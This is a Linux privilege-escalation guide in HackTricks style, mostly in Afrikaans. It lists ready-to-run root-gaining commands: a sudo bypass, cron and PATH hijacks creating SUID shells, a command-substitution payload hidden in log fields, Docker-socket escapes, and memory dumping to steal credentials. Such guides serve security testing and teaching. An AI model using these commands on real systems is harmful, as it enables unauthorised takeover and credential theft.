# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Stelselinligting

### OS-inligting

Kom ons begin om inligting te versamel oor die OS wat aan die gang is
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

As jy **have write permissions on any folder inside the `PATH`** veranderlike het, kan jy dalk sekere libraries of binaries kaap:
```bash
echo $PATH
```
### Omgewingsinligting

Interessante inligting, wagwoorde of API-sleutels in die omgewingsveranderlikes?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kontroleer die kernel-weergawe en of daar 'n exploit is wat gebruik kan word om privileges te escalate.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Jy kan 'n goeie lys van kwesbare kernels en sommige reeds **compiled exploits** hier vind: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Ander webwerwe waar jy sommige **compiled exploits** kan vind: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Om al die kwesbare kernel-weergawes uit daardie web te onttrek kan jy:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gereedskap wat kan help om na kernel exploits te soek, is:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (voer uit IN victim, kontroleer slegs exploits vir kernel 2.x)

Soek altyd **die kernel-weergawe in Google**, moontlik is jou kernel-weergawe in 'n kernel exploit vermeld en dan sal jy seker wees dat hierdie exploit geldig is.

Addisionele kernel exploitation tegnieke:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-weergawe

Gebaseer op die kwesbare sudo-weergawes wat verskyn in:
```bash
searchsploit sudo
```
Jy kan nagaan of die sudo-weergawe kwesbaar is deur hierdie grep te gebruik.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-weergawes voor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) laat ongeprivilegieerde plaaslike gebruikers toe om hul bevoegdhede na root te eskaleer via die sudo `--chroot` opsie wanneer die `/etc/nsswitch.conf` lêer vanaf 'n deur die gebruiker beheerde gids gebruik word.

Hier is 'n [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) om daardie [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) te exploit. Voordat jy die exploit uitvoer, maak seker dat jou `sudo` weergawe kwesbaar is en dat dit die `chroot` funksie ondersteun.

Vir meer inligting, verwys na die oorspronklike [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

Van @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg handtekeningverifikasie het misluk

Kyk na **smasher2 box of HTB** vir 'n **voorbeeld** van hoe hierdie vuln could be exploited
```bash
dmesg 2>/dev/null | grep "signature"
```
### Meer stelsel-enumerasie
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Som moontlike verdedigings op

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

As jy binne 'n docker container is, kan jy probeer om daaruit te ontsnap:

{{#ref}}
docker-security/
{{#endref}}

## Drives

Kontroleer **wat is mounted and unmounted**, waar en waarom. As iets unmounted is kan jy probeer om dit te mount en te kyk vir privaat inligting
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nuttige sagteware

Lys nuttige binaries
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Kyk ook of **enige kompilator geïnstalleer is**. Dit is nuttig as jy 'n kernel exploit moet gebruik, aangesien dit aanbeveel word om dit op die masjien te kompileer waar jy dit gaan gebruik (of op 'n soortgelyke masjien).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Geïnstalleerde kwesbare sagteware

Kontroleer die **weergawe van die geïnstalleerde pakkette en dienste**. Miskien is daar 'n ouer Nagios-weergawe (byvoorbeeld) wat uitgebuit kan word om escalating privileges te verkry…\
Dit word aanbeveel om die weergawes van die meer verdagte geïnstalleerde sagteware handmatig na te gaan.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
As jy SSH-toegang tot die masjien het, kan jy ook **openVAS** gebruik om verouderde en kwesbare sagteware wat binne die masjien geïnstalleer is, na te gaan.

> [!NOTE] > _Let wel dat hierdie kommando's baie inligting sal wys wat meestal nutteloos sal wees; daarom word toepassings soos OpenVAS of soortgelykes aanbeveel om te kontroleer of enige geïnstalleerde sagtewareweergawe kwesbaar is vir bekende exploits_

## Prosesse

Kyk na **watter prosesse** uitgevoer word en kontroleer of enige proses **meer voorregte as wat dit behoort te hê** het (miskien 'n tomcat wat deur root uitgevoer word?)
```bash
ps aux
ps -ef
top -n 1
```
Kyk altyd vir moontlike [**electron/cef/chromium debuggers** wat loop; jy kan dit misbruik om privileges te eskaleer](electron-cef-chromium-debugger-abuse.md). **Linpeas** herken dit deur die `--inspect` parameter in die command line van die proses na te gaan.\
Kontroleer ook jou privileges oor die process binaries, dalk kan jy iemand oorskryf.

### Prosesmonitering

Jy kan gereedskap soos [**pspy**](https://github.com/DominicBreuker/pspy) gebruik om prosesse te monitor. Dit kan baie nuttig wees om kwesbare prosesse te identifiseer wat gereeld uitgevoer word of wanneer 'n stel vereistes vervul is.

### Prosesgeheue

Sommige dienste op 'n bediener stoor **credentials in clear text in die geheue**.\
Gewoonlik het jy **root privileges** nodig om die geheue van prosesse wat aan ander gebruikers behoort te lees, daarom is dit meestal meer nuttig wanneer jy reeds root is en meer credentials wil ontdek.\
Onthou egter dat **as 'n gewone gebruiker jy die geheue van die prosesse wat jy besit kan lees**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

As jy toegang tot die geheue van 'n FTP service (byvoorbeeld) het, kan jy die Heap kry en daarin na credentials soek.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Vir 'n gegewe proses-ID wys **maps hoe geheue binne daardie proses se** virtuele adresruimte; dit wys ook die **toestemmings van elke gemapte gebied**. Die **mem** pseudo-lêer **stel die proses se geheue self bloot**. Uit die **maps**-lêer weet ons watter **geheue-gebiede leesbaar is** en hul verskuiwings. Ons gebruik hierdie inligting om **in die mem-lêer te posisioneer en alle leesbare gebiede na 'n lêer uit te skryf**.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` bied toegang tot die stelsel se **fisiese** geheue, nie die virtuele geheue nie. Die kernel se virtuele adresruimte kan bereik word deur /dev/kmem te gebruik.\
Tipies is `/dev/mem` slegs leesbaar deur **root** en die **kmem** groep.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump vir linux

ProcDump is 'n Linux-herinterpretasie van die klassieke ProcDump-hulpmiddel uit die Sysinternals-suite van hulpmiddels vir Windows. Kry dit by [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Gereedskap

Om die geheue van 'n proses te dump, kan jy die volgende gebruik:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Jy kan handmatig die root-vereistes verwyder en dump die proses wat aan jou behoort
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root word vereis)

### Inlogbewyse uit Prosesgeheue

#### Handmatige voorbeeld

As jy vind dat die authenticator-proses aan die gang is:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Jy kan die process dump (sien vorige afdelings om verskillende maniere te vind om die memory van 'n process te dump) en soek na credentials in die memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Die tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) sal **clear text credentials uit geheue steel** en van sommige **well known files**. Dit vereis root-bevoegdhede om behoorlik te werk.

| Funksie                                           | Prosesnaam           |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Soek Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geskeduleerde/Cron take

### Crontab UI (alseambusher) running as root – web-based scheduler privesc

As 'n web "Crontab UI" paneel (alseambusher/crontab-ui) as root loopback-gebind is, kan jy dit steeds via SSH local port-forwarding bereik en 'n privileged job skep om te escalate.

Tipiese ketting
- Ontdek 'n loopback-only poort (bv., 127.0.0.1:8000) en die Basic-Auth realm met `ss -ntlp` / `curl -v localhost:8000`
- Vind inlogbewyse in operasionele artefakte:
- Rugsteun/scripts met `zip -P <password>`
- systemd unit wat `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` blootstel
- Tunnel en aanmelding:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Skep 'n high-priv job en voer dit onmiddellik uit (skep 'n SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Gebruik dit:
```bash
/tmp/rootshell -p   # root shell
```
Verharding
- Moenie Crontab UI as root laat loop nie; beperk dit tot 'n toegewyde gebruiker met minimale regte
- Bind aan localhost en beperk verder toegang via firewall/VPN; moenie wagwoorde hergebruik nie
- Vermy om geheime in unit files in te bed; gebruik secret stores of 'n root-only EnvironmentFile
- Aktiveer audit/logging vir on-demand taakuitvoerings



Kontroleer of enige geskeduleerde taak kwesbaar is. Miskien kan jy voordeel trek uit 'n skrip wat deur root uitgevoer word (wildcard vuln? kan jy lêers wysig wat root gebruik? use symlinks? skep spesifieke lêers in die gids wat root gebruik?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron-pad

Byvoorbeeld, binne _/etc/crontab_ kan jy die PATH vind: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Let op hoe die gebruiker "user" skryfprivileges het oor /home/user_)

As binne hierdie crontab die root gebruiker probeer om 'n opdrag of skrip uit te voer sonder om die PATH te stel. Byvoorbeeld: _\* \* \* \* root overwrite.sh_\
Dan kan jy 'n root shell kry deur:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron wat 'n script met 'n wildcard gebruik (Wildcard Injection)

As 'n script deur root uitgevoer word en 'n “**\***” binne 'n opdrag het, kan jy dit uitbuit om onverwagte dinge te doen (soos privesc). Voorbeeld:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**As die wildcard voorafgegaan word deur 'n pad soos** _**/some/path/\***_ **, is dit nie kwesbaar nie (selfs** _**./\***_ **nie).**

Lees die volgende bladsy vir meer wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash voer parameter expansion en command substitution uit voordat arithmetic evaluation in ((...)), $((...)) en let plaasvind. As 'n root cron/parser onbetroubare log fields lees en hulle in 'n arithmetic context invoer, kan 'n aanvaller 'n command substitution $(...) injekteer wat as root uitgevoer word wanneer die cron loop.

- Waarom dit werk: In Bash gebeur expansions in hierdie volgorde: parameter/variable expansion, command substitution, arithmetic expansion, daarna word splitting en pathname expansion. Dus word 'n waarde soos `$(/bin/bash -c 'id > /tmp/pwn')0` eers vervang (die command loop), daarna word die oorblywende numeriese `0` vir die arithmetic gebruik sodat die script sonder foute voortgaan.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Uitbuiting: Laat aanvaller-beheerde teks in die geparsde log geskryf word sodat die numeries-lykende veld 'n command substitution bevat en op 'n syfer eindig. Maak seker jou command druk nie op stdout nie (of herlei dit) sodat die arithmetic geldig bly.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

As jy **kan wysig 'n cron script** wat deur root uitgevoer word, kan jy baie maklik 'n shell kry:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
As die script wat deur root uitgevoer word 'n **directory waar jy volle toegang tot het** gebruik, kan dit dalk nuttig wees om daardie folder te verwyder en 'n **symlink folder na 'n ander een** te skep wat 'n script bedien wat deur jou beheer word
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
Blue teams teken soms cron-gedrewe binaries "sign" deur 'n custom ELF-seksie te dump en te greppen vir 'n vendor-string voordat dit as root uitgevoer word. As daardie binary group-writable is (bv. `/opt/AV/periodic-checks/monitor` besit deur `root:devs 770`) en jy kan die signing material leak, kan jy die seksie vervals en die cron-taak kap:

1. Gebruik `pspy` om die verifikasie-flow vas te vang. In Era het root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` uitgevoer, gevolg deur `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` en toe die file uitgevoer.
2. Herstel die verwagte sertifikaat met die gelekte sleutel/config (van `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Bou 'n kwaadwillige vervanging (bv. drop 'n SUID bash, voeg jou SSH key by) en embed die sertifikaat in `.text_sig` sodat die grep slaag:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Oorskryf die geskeduleerde binary terwyl jy die execute-bits behou:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Wag vir die volgende cron-run; sodra die naiewe signature-check slaag, hardloop jou payload as root.

### Frequent cron jobs

Jy kan prosesse monitor om prosesse te vind wat elke 1, 2 of 5 minute uitgevoer word. Miskien kan jy dit uitbuit en privileges eskaleer.

Byvoorbeeld, om **elke 0.1s vir 1 minuut te monitor**, **sorteer volgens minder uitgevoerde opdragte** en die opdragte wat die meeste uitgevoer is te verwyder, kan jy doen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Jy kan ook gebruik maak van** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (dit sal alle prosesse wat begin monitor en lys).

### Onsigbare cron jobs

Dit is moontlik om 'n cronjob te skep deur 'n carriage return na 'n kommentaar te plaas (sonder die newline character), en die cronjob sal werk. Voorbeeld (let op die carriage return karakter):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Dienste

### Skryfbare _.service_ lêers

Kyk of jy enige `.service` lêer kan skryf; as jy dit kan, kan jy dit **wysig** sodat dit jou **backdoor** **uitvoer wanneer** die diens **begin**, **herbegin** of **gestop** word (mag wees jy moet wag totdat die masjien herbegin).\
Byvoorbeeld, skep jou backdoor binne die .service-lêer met **`ExecStart=/tmp/script.sh`**

### Skryfbare service binaries

Hou in gedagte dat as jy **skryfregte oor binaries wat deur dienste uitgevoer word** het, jy dit kan verander na backdoors sodat wanneer die dienste weer uitgevoer word, die backdoors uitgevoer sal word.

### systemd PATH - Relative Paths

Jy kan die PATH wat deur **systemd** gebruik word sien met:
```bash
systemctl show-environment
```
As jy agterkom dat jy in enige van die gidse van die pad kan **write**, mag jy moontlik **escalate privileges**. Jy moet soek na **relative paths being used on service configurations** lêers soos:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Skep dan 'n **uitvoerbare** met presies dieselfde naam as die relatiewe pad binary binne die systemd PATH-gids wat jy kan skryf, en wanneer die diens gevra word om die kwesbare aksie uit te voer (**Start**, **Stop**, **Reload**), sal jou **backdoor** uitgevoer word (onbevoorregte gebruikers kan gewoonlik nie dienste start/stop nie, maar kyk of jy `sudo -l` kan gebruik).

**Leer meer oor dienste met `man systemd.service`.**

## **Timers**

**Timers** is systemd-eenheidlêers waarvan die naam eindig op `**.timer**` wat `**.service**` lêers of gebeure beheer. **Timers** kan as 'n alternatief vir cron gebruik word, aangesien hulle ingeboude ondersteuning het vir kalender-tydgebeure en monotoniese tydgebeure en asynkrone uitgevoer kan word.

Jy kan al die timers opnoem met:
```bash
systemctl list-timers --all
```
### Skryfbare timers

As jy 'n timer kan wysig, kan jy dit gebruik om sekere bestaande systemd.unit te aktiveer (soos 'n `.service` of 'n `.target`).
```bash
Unit=backdoor.service
```
In die dokumentasie kan jy lees wat die Unit is:

> Die eenheid wat geaktiveer word wanneer hierdie timer verstryk. Die argument is 'n eenheidsnaam, waarvan die agtervoegsel nie ".timer" is nie. As dit nie gespesifiseer is nie, val hierdie waarde terug op 'n service wat dieselfde naam as die timer-eenheid het, behalwe vir die agtervoegsel. (Sien hierbo.) Dit word aanbeveel dat die eenheidsnaam wat geaktiveer word en die eenheidsnaam van die timer-eenheid identies genoem word, behalwe vir die agtervoegsel.

Daarom, om hierdie toestemming te misbruik sou jy die volgende moes doen:

- Vind 'n systemd unit (soos 'n `.service`) wat 'n **skryfbare binêre** uitvoer
- Vind 'n systemd unit wat 'n **relatiewe pad** uitvoer en oor **skryfbevoegdhede** oor die **systemd PATH** beskik (om daardie uitvoerbare lêer na te boots)

**Lees meer oor timers met `man systemd.timer`.**

### **Timer inskakeling**

Om 'n timer in te skakel het jy root-privileges nodig en moet jy die volgende uitvoer:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **proseskommunikasie** op dieselfde of verskillende masjiene binne kliënt-bedienermodelle. Hulle gebruik standaard Unix-beskrywerlêers vir inter-rekenaarkommunikasie en word opgestel deur `.socket` lêers.

Sockets kan gekonfigureer word met `.socket` lêers.

**Lees meer oor sockets met `man systemd.socket`.** In hierdie lêer kan verskeie interessante parameters gekonfigureer word:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Hierdie opsies verskil, maar 'n samevatting word gebruik om **aan te dui waarheen dit gaan luister** na die socket (die pad van die AF_UNIX socket-lêer, die IPv4/6 en/of poortnommer om na te luister, ens.)
- `Accept`: Neem 'n boolean-argument. As dit **true** is, word 'n **service instance geskep vir elke inkomende verbinding** en slegs die verbindings-socket word daaraan deurgegee. As dit **false** is, word al die luister-sockets self **aan die gestarte service unit deurgegee**, en slegs een service unit word geskep vir alle verbindings. Hierdie waarde word geïgnoreer vir datagram sockets en FIFOs waar 'n enkele service unit onvoorwaardelik al die inkomende verkeer hanteer. **Standaard is false**. Vir prestasiedoeleindes word aanbeveel om nuwe daemons slegs so te skryf dat dit geskik is vir `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Neem een of meer opdragreëls wat onderskeidelik **uitgevoer word voordat** of **nadat** die luister **sockets**/FIFOs **geskep** en gebind is. Die eerste token van die opdragreël moet 'n absolute lêernaam wees, gevolg deur argumente vir die proses.
- `ExecStopPre`, `ExecStopPost`: Addisionele **opdragte** wat onderskeidelik **uitgevoer word voordat** of **nadat** die luister **sockets**/FIFOs **gesluit** en verwyder word.
- `Service`: Spesifiseer die **service**-unit naam **om te aktiveer** by **inkomende verkeer**. Hierdie instelling is slegs toegelaat vir sockets met Accept=no. Dit val terug op die service wat dieselfde naam as die socket dra (met die agtervoegsel vervang). In die meeste gevalle behoort dit nie nodig te wees om hierdie opsie te gebruik nie.

### Writable .socket files

As jy 'n **skryfbare** `.socket` lêer vind, kan jy aan die begin van die `[Socket]`-afdeling iets soos byvoeg: `ExecStartPre=/home/kali/sys/backdoor` en die backdoor sal uitgevoer word voordat die socket geskep word. Daarom sal jy **waarskynlik moet wag totdat die masjien herbegin is.**\
_Neem kennis dat die stelsel daardie socket-lêer konfigurasie moet gebruik anders sal die backdoor nie uitgevoer word nie_

### Writable sockets

As jy enige **skryfbare socket** identifiseer (_nou praat ons oor Unix Sockets en nie oor die konfigurasie `.socket` lêers nie_), kan **jy met daardie socket kommunikeer** en moontlik 'n kwesbaarheid uitbuit.

### Enumereer Unix Sockets
```bash
netstat -a -p --unix
```
### Ruwe verbinding
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Voorbeeld van eksploitasie:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Let wel dat daar moontlik sommige **sockets listening for HTTP** requests is (_Ek praat nie oor .socket files nie, maar oor die lêers wat as unix sockets optree_). Jy kan dit nagaan met:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
As die socket **met 'n HTTP-versoek reageer**, dan kan jy daarmee **kommunikeer** en dalk **exploit some vulnerability**.

### Skryfbare Docker Socket

Die Docker socket, dikwels te vind by `/var/run/docker.sock`, is 'n kritieke lêer wat beveilig moet word. Volgens verstek is dit skryfbaar deur die gebruiker `root` en lede van die `docker` groep. Om write access tot hierdie socket te hê kan lei tot privilege escalation. Hieronder is 'n uiteensetting van hoe dit gedoen kan word en alternatiewe metodes as die Docker CLI nie beskikbaar is nie.

#### **Privilege Escalation with Docker CLI**

As jy write access tot die Docker socket het, kan jy escalate privileges deur die volgende opdragte te gebruik:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hierdie opdragte laat jou toe om 'n container te bestuur met root-vlak toegang tot die gasheer se lêerstelsel.

#### **Gebruik Docker API Direk**

In gevalle waar die Docker CLI nie beskikbaar is nie, kan die Docker socket nog steeds gemanipuleer word deur die Docker API en `curl`-opdragte.

1.  **List Docker Images:** Haal die lys van beskikbare images op.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Stuur 'n versoek om 'n container te skep wat die gasheerstelsel se root-gids koppel.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start die nuut geskepte container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Gebruik `socat` om 'n konneksie met die container te vestig, wat jou in staat stel om opdragte binne dit uit te voer.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

